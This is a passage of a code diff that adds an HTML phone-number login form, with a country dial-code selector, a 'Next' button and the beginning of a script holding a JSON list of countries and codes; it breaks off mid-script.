+                <div class="country-menu-item cid_105" country-code="39"  country-name="Italy"><div class="country-menu-item-image"><img src="static/country/1f1ee-1f1f9.png"></img><span>Italy</span></div><span class="country-menu-item-code">+39</span></div>
+                <div class="country-menu-item cid_106" country-code="1876"  country-name="Jamaica"><div class="country-menu-item-image"><img src="static/country/1f1ef-1f1f2.png"></img><span>Jamaica</span></div><span class="country-menu-item-code">+1876</span></div>
+                <div class="country-menu-item cid_107" country-code="81"  country-name="Japan"><div class="country-menu-item-image"><img src="static/country/1f1ef-1f1f5.png"></img><span>Japan</span></div><span class="country-menu-item-code">+81</span></div>
+                <div class="country-menu-item cid_108" country-code="962"  country-name="Jordan"><div class="country-menu-item-image"><img src="static/country/1f1ef-1f1f4.png"></img><span>Jordan</span></div><span class="country-menu-item-code">+962</span></div>
+                <div class="country-menu-item cid_109" country-code="7"  country-name="Kazakhstan"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1ff.png"></img><span>Kazakhstan</span></div><span class="country-menu-item-code">+7</span></div>
+                <div class="country-menu-item cid_110" country-code="254"  country-name="Kenya"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1ea.png"></img><span>Kenya</span></div><span class="country-menu-item-code">+254</span></div>
+                <div class="country-menu-item cid_111" country-code="686"  country-name="Kiribati"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1ee.png"></img><span>Kiribati</span></div><span class="country-menu-item-code">+686</span></div>
+                <div class="country-menu-item cid_112" country-code="383"  country-name="Kosovo"><div class="country-menu-item-image"><img src="static/country/1f1fd-1f1f0.png"></img><span>Kosovo</span></div><span class="country-menu-item-code">+383</span></div>
+                <div class="country-menu-item cid_113" country-code="965"  country-name="Kuwait"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1fc.png"></img><span>Kuwait</span></div><span class="country-menu-item-code">+965</span></div>
+                <div class="country-menu-item cid_114" country-code="996"  country-name="Kyrgyzstan"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1ec.png"></img><span>Kyrgyzstan</span></div><span class="country-menu-item-code">+996</span></div>
+                <div class="country-menu-item cid_115" country-code="856"  country-name="Laos"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1e6.png"></img><span>Laos</span></div><span class="country-menu-item-code">+856</span></div>
+                <div class="country-menu-item cid_116" country-code="371"  country-name="Latvia"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1fb.png"></img><span>Latvia</span></div><span class="country-menu-item-code">+371</span></div>
+                <div class="country-menu-item cid_117" country-code="961"  country-name="Lebanon"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1e7.png"></img><span>Lebanon</span></div><span class="country-menu-item-code">+961</span></div>
+                <div class="country-menu-item cid_118" country-code="266"  country-name="Lesotho"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1f8.png"></img><span>Lesotho</span></div><span class="country-menu-item-code">+266</span></div>
+                <div class="country-menu-item cid_119" country-code="231"  country-name="Liberia"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1f7.png"></img><span>Liberia</span></div><span class="country-menu-item-code">+231</span></div>
+                <div class="country-menu-item cid_120" country-code="218"  country-name="Libya"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1fe.png"></img><span>Libya</span></div><span class="country-menu-item-code">+218</span></div>
+                <div class="country-menu-item cid_121" country-code="423"  country-name="Liechtenstein"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1ee.png"></img><span>Liechtenstein</span></div><span class="country-menu-item-code">+423</span></div>
+                <div class="country-menu-item cid_122" country-code="370"  country-name="Lithuania"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1f9.png"></img><span>Lithuania</span></div><span class="country-menu-item-code">+370</span></div>
+                <div class="country-menu-item cid_123" country-code="352"  country-name="Luxembourg"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1fa.png"></img><span>Luxembourg</span></div><span class="country-menu-item-code">+352</span></div>
+                <div class="country-menu-item cid_124" country-code="853"  country-name="Macau"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f4.png"></img><span>Macau</span></div><span class="country-menu-item-code">+853</span></div>
+                <div class="country-menu-item cid_125" country-code="261"  country-name="Madagascar"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1ec.png"></img><span>Madagascar</span></div><span class="country-menu-item-code">+261</span></div>
+                <div class="country-menu-item cid_126" country-code="265"  country-name="Malawi"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1fc.png"></img><span>Malawi</span></div><span class="country-menu-item-code">+265</span></div>
+                <div class="country-menu-item cid_127" country-code="60"  country-name="Malaysia"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1fe.png"></img><span>Malaysia</span></div><span class="country-menu-item-code">+60</span></div>
+                <div class="country-menu-item cid_128" country-code="960"  country-name="Maldives"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1fb.png"></img><span>Maldives</span></div><span class="country-menu-item-code">+960</span></div>
+                <div class="country-menu-item cid_129" country-code="223"  country-name="Mali"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f1.png"></img><span>Mali</span></div><span class="country-menu-item-code">+223</span></div>
+                <div class="country-menu-item cid_130" country-code="356"  country-name="Malta"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f9.png"></img><span>Malta</span></div><span class="country-menu-item-code">+356</span></div>
+                <div class="country-menu-item cid_131" country-code="692"  country-name="Marshall Islands"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1ed.png"></img><span>Marshall Islands</span></div><span class="country-menu-item-code">+692</span></div>
+                <div class="country-menu-item cid_132" country-code="596"  country-name="Martinique"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f6.png"></img><span>Martinique</span></div><span class="country-menu-item-code">+596</span></div>
+                <div class="country-menu-item cid_133" country-code="222"  country-name="Mauritania"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f7.png"></img><span>Mauritania</span></div><span class="country-menu-item-code">+222</span></div>
+                <div class="country-menu-item cid_134" country-code="230"  country-name="Mauritius"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1fa.png"></img><span>Mauritius</span></div><span class="country-menu-item-code">+230</span></div>
+                <div class="country-menu-item cid_135" country-code="52"  country-name="Mexico"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1fd.png"></img><span>Mexico</span></div><span class="country-menu-item-code">+52</span></div>
+                <div class="country-menu-item cid_136" country-code="691"  country-name="Micronesia"><div class="country-menu-item-image"><img src="static/country/1f1eb-1f1f2.png"></img><span>Micronesia</span></div><span class="country-menu-item-code">+691</span></div>
+                <div class="country-menu-item cid_137" country-code="373"  country-name="Moldova"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1e9.png"></img><span>Moldova</span></div><span class="country-menu-item-code">+373</span></div>
+                <div class="country-menu-item cid_138" country-code="377"  country-name="Monaco"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1e8.png"></img><span>Monaco</span></div><span class="country-menu-item-code">+377</span></div>
+                <div class="country-menu-item cid_139" country-code="976"  country-name="Mongolia"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f3.png"></img><span>Mongolia</span></div><span class="country-menu-item-code">+976</span></div>
+                <div class="country-menu-item cid_140" country-code="382"  country-name="Montenegro"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1ea.png"></img><span>Montenegro</span></div><span class="country-menu-item-code">+382</span></div>
+                <div class="country-menu-item cid_141" country-code="1664"  country-name="Montserrat"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f8.png"></img><span>Montserrat</span></div><span class="country-menu-item-code">+1664</span></div>
+                <div class="country-menu-item cid_142" country-code="212"  country-name="Morocco"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1e6.png"></img><span>Morocco</span></div><span class="country-menu-item-code">+212</span></div>
+                <div class="country-menu-item cid_143" country-code="258"  country-name="Mozambique"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1ff.png"></img><span>Mozambique</span></div><span class="country-menu-item-code">+258</span></div>
+                <div class="country-menu-item cid_144" country-code="95"  country-name="Myanmar"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f2.png"></img><span>Myanmar</span></div><span class="country-menu-item-code">+95</span></div>
+                <div class="country-menu-item cid_145" country-code="264"  country-name="Namibia"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1e6.png"></img><span>Namibia</span></div><span class="country-menu-item-code">+264</span></div>
+                <div class="country-menu-item cid_146" country-code="674"  country-name="Nauru"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1f7.png"></img><span>Nauru</span></div><span class="country-menu-item-code">+674</span></div>
+                <div class="country-menu-item cid_147" country-code="977"  country-name="Nepal"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1f5.png"></img><span>Nepal</span></div><span class="country-menu-item-code">+977</span></div>
+                <div class="country-menu-item cid_148" country-code="31"  country-name="Netherlands"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1f1.png"></img><span>Netherlands</span></div><span class="country-menu-item-code">+31</span></div>
+                <div class="country-menu-item cid_149" country-code="687"  country-name="New Caledonia"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1e8.png"></img><span>New Caledonia</span></div><span class="country-menu-item-code">+687</span></div>
+                <div class="country-menu-item cid_150" country-code="64"  country-name="New Zealand"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1ff.png"></img><span>New Zealand</span></div><span class="country-menu-item-code">+64</span></div>
+                <div class="country-menu-item cid_151" country-code="505"  country-name="Nicaragua"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1ee.png"></img><span>Nicaragua</span></div><span class="country-menu-item-code">+505</span></div>
+                <div class="country-menu-item cid_152" country-code="227"  country-name="Niger"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1ea.png"></img><span>Niger</span></div><span class="country-menu-item-code">+227</span></div>
+                <div class="country-menu-item cid_153" country-code="234"  country-name="Nigeria"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1ec.png"></img><span>Nigeria</span></div><span class="country-menu-item-code">+234</span></div>
+                <div class="country-menu-item cid_154" country-code="683"  country-name="Niue"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1fa.png"></img><span>Niue</span></div><span class="country-menu-item-code">+683</span></div>
+                <div class="country-menu-item cid_155" country-code="672"  country-name="Norfolk Island"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1eb.png"></img><span>Norfolk Island</span></div><span class="country-menu-item-code">+672</span></div>
+                <div class="country-menu-item cid_156" country-code="850"  country-name="North Korea"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1f5.png"></img><span>North Korea</span></div><span class="country-menu-item-code">+850</span></div>
+                <div class="country-menu-item cid_157" country-code="389"  country-name="North Macedonia"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f0.png"></img><span>North Macedonia</span></div><span class="country-menu-item-code">+389</span></div>
+                <div class="country-menu-item cid_158" country-code="1670"  country-name="Northern Mariana Islands"><div class="country-menu-item-image"><img src="static/country/1f1f2-1f1f5.png"></img><span>Northern Mariana Islands</span></div><span class="country-menu-item-code">+1670</span></div>
+                <div class="country-menu-item cid_159" country-code="47"  country-name="Norway"><div class="country-menu-item-image"><img src="static/country/1f1f3-1f1f4.png"></img><span>Norway</span></div><span class="country-menu-item-code">+47</span></div>
+                <div class="country-menu-item cid_160" country-code="968"  country-name="Oman"><div class="country-menu-item-image"><img src="static/country/1f1f4-1f1f2.png"></img><span>Oman</span></div><span class="country-menu-item-code">+968</span></div>
+                <div class="country-menu-item cid_161" country-code="92"  country-name="Pakistan"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f0.png"></img><span>Pakistan</span></div><span class="country-menu-item-code">+92</span></div>
+                <div class="country-menu-item cid_162" country-code="680"  country-name="Palau"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1fc.png"></img><span>Palau</span></div><span class="country-menu-item-code">+680</span></div>
+                <div class="country-menu-item cid_163" country-code="970"  country-name="Palestine"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f8.png"></img><span>Palestine</span></div><span class="country-menu-item-code">+970</span></div>
+                <div class="country-menu-item cid_164" country-code="507"  country-name="Panama"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1e6.png"></img><span>Panama</span></div><span class="country-menu-item-code">+507</span></div>
+                <div class="country-menu-item cid_165" country-code="675"  country-name="Papua New Guinea"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1ec.png"></img><span>Papua New Guinea</span></div><span class="country-menu-item-code">+675</span></div>
+                <div class="country-menu-item cid_166" country-code="595"  country-name="Paraguay"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1fe.png"></img><span>Paraguay</span></div><span class="country-menu-item-code">+595</span></div>
+                <div class="country-menu-item cid_167" country-code="51"  country-name="Peru"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1ea.png"></img><span>Peru</span></div><span class="country-menu-item-code">+51</span></div>
+                <div class="country-menu-item cid_168" country-code="63"  country-name="Philippines"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1ed.png"></img><span>Philippines</span></div><span class="country-menu-item-code">+63</span></div>
+                <div class="country-menu-item cid_169" country-code="48"  country-name="Poland"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f1.png"></img><span>Poland</span></div><span class="country-menu-item-code">+48</span></div>
+                <div class="country-menu-item cid_170" country-code="351"  country-name="Portugal"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f9.png"></img><span>Portugal</span></div><span class="country-menu-item-code">+351</span></div>
+                <div class="country-menu-item cid_171" country-code="1787"  country-name="Puerto Rico"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f7.png"></img><span>Puerto Rico</span></div><span class="country-menu-item-code">+1787</span></div>
+                <div class="country-menu-item cid_172" country-code="1939"  country-name="Puerto Rico"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f7.png"></img><span>Puerto Rico</span></div><span class="country-menu-item-code">+1939</span></div>
+                <div class="country-menu-item cid_173" country-code="974"  country-name="Qatar"><div class="country-menu-item-image"><img src="static/country/1f1f6-1f1e6.png"></img><span>Qatar</span></div><span class="country-menu-item-code">+974</span></div>
+                <div class="country-menu-item cid_174" country-code="262"  country-name="Réunion"><div class="country-menu-item-image"><img src="static/country/1f1f7-1f1ea.png"></img><span>Réunion</span></div><span class="country-menu-item-code">+262</span></div>
+                <div class="country-menu-item cid_175" country-code="40"  country-name="Romania"><div class="country-menu-item-image"><img src="static/country/1f1f7-1f1f4.png"></img><span>Romania</span></div><span class="country-menu-item-code">+40</span></div>
+                <div class="country-menu-item cid_176" country-code="7"  country-name="Russian Federation"><div class="country-menu-item-image"><img src="static/country/1f1f7-1f1fa.png"></img><span>Russian Federation</span></div><span class="country-menu-item-code">+7</span></div>
+                <div class="country-menu-item cid_177" country-code="250"  country-name="Rwanda"><div class="country-menu-item-image"><img src="static/country/1f1f7-1f1fc.png"></img><span>Rwanda</span></div><span class="country-menu-item-code">+250</span></div>
+                <div class="country-menu-item cid_178" country-code="247"  country-name="Saint Helena"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ed.png"></img><span>Saint Helena</span></div><span class="country-menu-item-code">+247</span></div>
+                <div class="country-menu-item cid_179" country-code="290"  country-name="Saint Helena"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ed.png"></img><span>Saint Helena</span></div><span class="country-menu-item-code">+290</span></div>
+                <div class="country-menu-item cid_180" country-code="1869"  country-name="Saint Kitts &amp; Nevis"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1f3.png"></img><span>Saint Kitts &amp; Nevis</span></div><span class="country-menu-item-code">+1869</span></div>
+                <div class="country-menu-item cid_181" country-code="1758"  country-name="Saint Lucia"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1e8.png"></img><span>Saint Lucia</span></div><span class="country-menu-item-code">+1758</span></div>
+                <div class="country-menu-item cid_182" country-code="508"  country-name="Saint Pierre &amp; Miquelon"><div class="country-menu-item-image"><img src="static/country/1f1f5-1f1f2.png"></img><span>Saint Pierre &amp; Miquelon</span></div><span class="country-menu-item-code">+508</span></div>
+                <div class="country-menu-item cid_183" country-code="1784"  country-name="Saint Vincent &amp; the Grenadines"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1e8.png"></img><span>Saint Vincent &amp; the Grenadines</span></div><span class="country-menu-item-code">+1784</span></div>
+                <div class="country-menu-item cid_184" country-code="685"  country-name="Samoa"><div class="country-menu-item-image"><img src="static/country/1f1fc-1f1f8.png"></img><span>Samoa</span></div><span class="country-menu-item-code">+685</span></div>
+                <div class="country-menu-item cid_185" country-code="378"  country-name="San Marino"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f2.png"></img><span>San Marino</span></div><span class="country-menu-item-code">+378</span></div>
+                <div class="country-menu-item cid_186" country-code="239"  country-name="São Tomé &amp; Príncipe"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f9.png"></img><span>São Tomé &amp; Príncipe</span></div><span class="country-menu-item-code">+239</span></div>
+                <div class="country-menu-item cid_187" country-code="966"  country-name="Saudi Arabia"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1e6.png"></img><span>Saudi Arabia</span></div><span class="country-menu-item-code">+966</span></div>
+                <div class="country-menu-item cid_188" country-code="221"  country-name="Senegal"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f3.png"></img><span>Senegal</span></div><span class="country-menu-item-code">+221</span></div>
+                <div class="country-menu-item cid_189" country-code="381"  country-name="Serbia"><div class="country-menu-item-image"><img src="static/country/1f1f7-1f1f8.png"></img><span>Serbia</span></div><span class="country-menu-item-code">+381</span></div>
+                <div class="country-menu-item cid_190" country-code="248"  country-name="Seychelles"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1e8.png"></img><span>Seychelles</span></div><span class="country-menu-item-code">+248</span></div>
+                <div class="country-menu-item cid_191" country-code="232"  country-name="Sierra Leone"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f1.png"></img><span>Sierra Leone</span></div><span class="country-menu-item-code">+232</span></div>
+                <div class="country-menu-item cid_192" country-code="65"  country-name="Singapore"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ec.png"></img><span>Singapore</span></div><span class="country-menu-item-code">+65</span></div>
+                <div class="country-menu-item cid_193" country-code="1721"  country-name="Sint Maarten"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1fd.png"></img><span>Sint Maarten</span></div><span class="country-menu-item-code">+1721</span></div>
+                <div class="country-menu-item cid_194" country-code="421"  country-name="Slovakia"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f0.png"></img><span>Slovakia</span></div><span class="country-menu-item-code">+421</span></div>
+                <div class="country-menu-item cid_195" country-code="386"  country-name="Slovenia"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ee.png"></img><span>Slovenia</span></div><span class="country-menu-item-code">+386</span></div>
+                <div class="country-menu-item cid_196" country-code="677"  country-name="Solomon Islands"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1e7.png"></img><span>Solomon Islands</span></div><span class="country-menu-item-code">+677</span></div>
+                <div class="country-menu-item cid_197" country-code="252"  country-name="Somalia"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f4.png"></img><span>Somalia</span></div><span class="country-menu-item-code">+252</span></div>
+                <div class="country-menu-item cid_198" country-code="27"  country-name="South Africa"><div class="country-menu-item-image"><img src="static/country/1f1ff-1f1e6.png"></img><span>South Africa</span></div><span class="country-menu-item-code">+27</span></div>
+                <div class="country-menu-item cid_199" country-code="82"  country-name="South Korea"><div class="country-menu-item-image"><img src="static/country/1f1f0-1f1f7.png"></img><span>South Korea</span></div><span class="country-menu-item-code">+82</span></div>
+                <div class="country-menu-item cid_200" country-code="211"  country-name="South Sudan"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f8.png"></img><span>South Sudan</span></div><span class="country-menu-item-code">+211</span></div>
+                <div class="country-menu-item cid_201" country-code="34"  country-name="Spain"><div class="country-menu-item-image"><img src="static/country/1f1ea-1f1f8.png"></img><span>Spain</span></div><span class="country-menu-item-code">+34</span></div>
+                <div class="country-menu-item cid_202" country-code="94"  country-name="Sri Lanka"><div class="country-menu-item-image"><img src="static/country/1f1f1-1f1f0.png"></img><span>Sri Lanka</span></div><span class="country-menu-item-code">+94</span></div>
+                <div class="country-menu-item cid_203" country-code="249"  country-name="Sudan"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1e9.png"></img><span>Sudan</span></div><span class="country-menu-item-code">+249</span></div>
+                <div class="country-menu-item cid_204" country-code="597"  country-name="Suriname"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1f7.png"></img><span>Suriname</span></div><span class="country-menu-item-code">+597</span></div>
+                <div class="country-menu-item cid_205" country-code="46"  country-name="Sweden"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1ea.png"></img><span>Sweden</span></div><span class="country-menu-item-code">+46</span></div>
+                <div class="country-menu-item cid_206" country-code="41"  country-name="Switzerland"><div class="country-menu-item-image"><img src="static/country/1f1e8-1f1ed.png"></img><span>Switzerland</span></div><span class="country-menu-item-code">+41</span></div>
+                <div class="country-menu-item cid_207" country-code="963"  country-name="Syria"><div class="country-menu-item-image"><img src="static/country/1f1f8-1f1fe.png"></img><span>Syria</span></div><span class="country-menu-item-code">+963</span></div>
+                <div class="country-menu-item cid_208" country-code="886"  country-name="Taiwan"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1fc.png"></img><span>Taiwan</span></div><span class="country-menu-item-code">+886</span></div>
+                <div class="country-menu-item cid_209" country-code="992"  country-name="Tajikistan"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1ef.png"></img><span>Tajikistan</span></div><span class="country-menu-item-code">+992</span></div>
+                <div class="country-menu-item cid_210" country-code="255"  country-name="Tanzania"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1ff.png"></img><span>Tanzania</span></div><span class="country-menu-item-code">+255</span></div>
+                <div class="country-menu-item cid_211" country-code="66"  country-name="Thailand"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1ed.png"></img><span>Thailand</span></div><span class="country-menu-item-code">+66</span></div>
+                <div class="country-menu-item cid_212" country-code="670"  country-name="Timor-Leste"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f1.png"></img><span>Timor-Leste</span></div><span class="country-menu-item-code">+670</span></div>
+                <div class="country-menu-item cid_213" country-code="228"  country-name="Togo"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1ec.png"></img><span>Togo</span></div><span class="country-menu-item-code">+228</span></div>
+                <div class="country-menu-item cid_214" country-code="690"  country-name="Tokelau"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f0.png"></img><span>Tokelau</span></div><span class="country-menu-item-code">+690</span></div>
+                <div class="country-menu-item cid_215" country-code="676"  country-name="Tonga"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f4.png"></img><span>Tonga</span></div><span class="country-menu-item-code">+676</span></div>
+                <div class="country-menu-item cid_216" country-code="1868"  country-name="Trinidad &amp; Tobago"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f9.png"></img><span>Trinidad &amp; Tobago</span></div><span class="country-menu-item-code">+1868</span></div>
+                <div class="country-menu-item cid_217" country-code="216"  country-name="Tunisia"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f3.png"></img><span>Tunisia</span></div><span class="country-menu-item-code">+216</span></div>
+                <div class="country-menu-item cid_218" country-code="90"  country-name="Turkey"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f7.png"></img><span>Turkey</span></div><span class="country-menu-item-code">+90</span></div>
+                <div class="country-menu-item cid_219" country-code="993"  country-name="Turkmenistan"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1f2.png"></img><span>Turkmenistan</span></div><span class="country-menu-item-code">+993</span></div>
+                <div class="country-menu-item cid_220" country-code="1649"  country-name="Turks &amp; Caicos Islands"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1e8.png"></img><span>Turks &amp; Caicos Islands</span></div><span class="country-menu-item-code">+1649</span></div>
+                <div class="country-menu-item cid_221" country-code="688"  country-name="Tuvalu"><div class="country-menu-item-image"><img src="static/country/1f1f9-1f1fb.png"></img><span>Tuvalu</span></div><span class="country-menu-item-code">+688</span></div>
+                <div class="country-menu-item cid_222" country-code="256"  country-name="Uganda"><div class="country-menu-item-image"><img src="static/country/1f1fa-1f1ec.png"></img><span>Uganda</span></div><span class="country-menu-item-code">+256</span></div>
+                <div class="country-menu-item cid_223" country-code="380"  country-name="Ukraine"><div class="country-menu-item-image"><img src="static/country/1f1fa-1f1e6.png"></img><span>Ukraine</span></div><span class="country-menu-item-code">+380</span></div>
+                <div class="country-menu-item cid_224" country-code="971"  country-name="United Arab Emirates"><div class="country-menu-item-image"><img src="static/country/1f1e6-1f1ea.png"></img><span>United Arab Emirates</span></div><span class="country-menu-item-code">+971</span></div>
+                <div class="country-menu-item cid_225" country-code="44"  country-name="United Kingdom"><div class="country-menu-item-image"><img src="static/country/1f1ec-1f1e7.png"></img><span>United Kingdom</span></div><span class="country-menu-item-code">+44</span></div>
+                <div class="country-menu-item cid_226" country-code="598"  country-name="Uruguay"><div class="country-menu-item-image"><img src="static/country/1f1fa-1f1fe.png"></img><span>Uruguay</span></div><span class="country-menu-item-code">+598</span></div>
+                <div class="country-menu-item cid_227" country-code="1340"  country-name="US Virgin Islands"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1ee.png"></img><span>US Virgin Islands</span></div><span class="country-menu-item-code">+1340</span></div>
+                <div class="country-menu-item cid_228" country-code="1"  country-name="USA"><div class="country-menu-item-image"><img src="static/country/1f1fa-1f1f8.png"></img><span>USA</span></div><span class="country-menu-item-code">+1</span></div>
+                <div class="country-menu-item cid_229" country-code="998"  country-name="Uzbekistan"><div class="country-menu-item-image"><img src="static/country/1f1fa-1f1ff.png"></img><span>Uzbekistan</span></div><span class="country-menu-item-code">+998</span></div>
+                <div class="country-menu-item cid_230" country-code="678"  country-name="Vanuatu"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1fa.png"></img><span>Vanuatu</span></div><span class="country-menu-item-code">+678</span></div>
+                <div class="country-menu-item cid_231" country-code="58"  country-name="Venezuela"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1ea.png"></img><span>Venezuela</span></div><span class="country-menu-item-code">+58</span></div>
+                <div class="country-menu-item cid_232" country-code="84"  country-name="Vietnam"><div class="country-menu-item-image"><img src="static/country/1f1fb-1f1f3.png"></img><span>Vietnam</span></div><span class="country-menu-item-code">+84</span></div>
+                <div class="country-menu-item cid_234" country-code="967"  country-name="Yemen"><div class="country-menu-item-image"><img src="static/country/1f1fe-1f1ea.png"></img><span>Yemen</span></div><span class="country-menu-item-code">+967</span></div>
+                <div class="country-menu-item cid_235" country-code="260"  country-name="Zambia"><div class="country-menu-item-image"><img src="static/country/1f1ff-1f1f2.png"></img><span>Zambia</span></div><span class="country-menu-item-code">+260</span></div>
+                <div class="country-menu-item cid_236" country-code="263"  country-name="Zimbabwe"><div class="country-menu-item-image"><img src="static/country/1f1ff-1f1fc.png"></img><span>Zimbabwe</span></div><span class="country-menu-item-code">+263</span></div>
+            </div>
+        </div>
+
+        <div id="phone-wrap">
+            <input type="text" name="country" id="phone-input" autocomplete="off" inputmode="tel">
+            <label id="phone-lable-text">Your phone number</label>
+        </div>
+
+        <div id="login-btn-wrap" style="display: none">
+            <button id="login-btn">
+                <span id="login-btn-text">Next</span>
+                <div class="login-btn-loading-wrap">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="25 25 50 50">
+                        <circle cx="50" cy="50" r="20" fill="none" stroke-miterlimit="10"></circle>
+                    </svg>
+                </div>
+            </button>
+        </div>
+
+    </div>
+    <!-- <div id="mobutton"></div> -->
+    <div id="modal-wrap" style="position: fixed;top:0;left: 0;bottom: 0;right: 0;z-index: 9999;display: none"></div>
+
+<script>
+
+    var countryList = [{"code":"93","name":"Afghanistan","id":1},{"code":"355","name":"Albania","id":2},{"code":"213","name":"Algeria","id":3},{"code":"1684","name":"American Samoa","id":4},{"code":"376","name":"Andorra","id":5},{"code":"244","name":"Angola","id":6},{"code":"1264","name":"Anguilla","id":7},{"code":"888","name":"Anonymous Numbers","id":8},{"code":"1268","name":"Antigua & Barbuda","id":9},{"code":"54","name":"Argentina","id":10},{"code":"374","name":"Armenia","id":11},{"code":"297","name":"Aruba","id":12},{"code":"61","name":"Australia","id":13},{"code":"43","name":"Austria","id":14},{"code":"994","name":"Azerbaijan","id":15},{"code":"1242","name":"Bahamas","id":16},{"code":"973","name":"Bahrain","id":17},{"code":"880","name":"Bangladesh","id":18},{"code":"1246","name":"Barbados","id":19},{"code":"375","name":"Belarus","id":20},{"code":"32","name":"Belgium","id":21},{"code":"501","name":"Belize","id":22},{"code":"229","name":"Benin","id":23},{"code":"1441","name":"Bermuda","id":24},{"code":"975","name":"Bhutan","id":25},{"code":"591","name":"Bolivia","id":26},{"code":"599","name":"Bonaire, Sint Eustatius & Saba","id":27},{"code":"387","name":"Bosnia & Herzegovina","id":28},{"code":"267","name":"Botswana","id":29},{"code":"55","name":"Brazil","id":30},{"code":"1284","name":"British Virgin Islands","id":31},{"code":"673","name":"Brunei Darussalam","id":32},{"code":"359","name":"Bulgaria","id":33},{"code":"226","name":"Burkina Faso","id":34},{"code":"257","name":"Burundi","id":35},{"code":"855","name":"Cambodia","id":36},{"code":"237","name":"Cameroon","id":37},{"code":"1","name":"Canada","id":38},{"code":"238","name":"Cape Verde","id":39},{"code":"1345","name":"Cayman Islands","id":40},{"code":"236","name":"Central African 